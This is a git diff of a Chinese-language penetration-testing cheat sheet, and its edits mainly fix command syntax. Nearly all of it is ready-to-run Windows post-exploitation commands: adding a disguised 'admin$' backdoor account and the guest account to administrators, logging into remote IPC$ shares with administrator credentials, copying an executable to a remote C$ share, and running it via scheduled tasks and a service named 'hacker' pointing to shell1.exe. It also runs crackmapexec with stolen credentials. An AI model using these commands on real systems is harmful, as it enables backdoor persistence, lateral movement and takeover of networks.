@@ -567,8 +567,10 @@ useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
 ### windows
 ```
 net user admin$ Afabab@20 /add
-net localgroup administrators s6adm$ /add
+net localgroup administrators admin$ /add
+
 net user guest /active:yes
+net localgroup administrators guest /add
 
 Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组
 
@@ -988,9 +990,11 @@ Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 
 ## at&schtasks&sc横向
 
-使用明文密码登录到目标，需要135端口开启：
+使用明文密码登录到目标，需要445和139端口开启：
 ```
-Net use \\192.168.2.148\ipc$ password /user:test\administrator
+net use \\192.168.2.148\ipc$ password /user:test\administrator
+
+net use \\192.168.2.148\ipc$ password /user:administrator
 
 复制文件
 copy c:\1.exe \\192.168.2.148\c$
@@ -1003,7 +1007,7 @@ Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr
 Schtasks /run /s 192.168.2.148 /tn executefile /i
 Schtasks /delete /s 192.168.2.148 /tn executefile /f
 
-sc \\192.168.210.107 create hackerbinpath="c:\shell1.exe"   #创建服务
+sc \\192.168.210.107 create hacker binpath="c:\shell1.exe"   #创建服务
 sc \\192.168.210.107 start hacker      #启动hacker服务
 ```
 
@@ -1081,7 +1085,7 @@ proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e
 
 单独执行命令
 ```
-crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
 ```
 
 
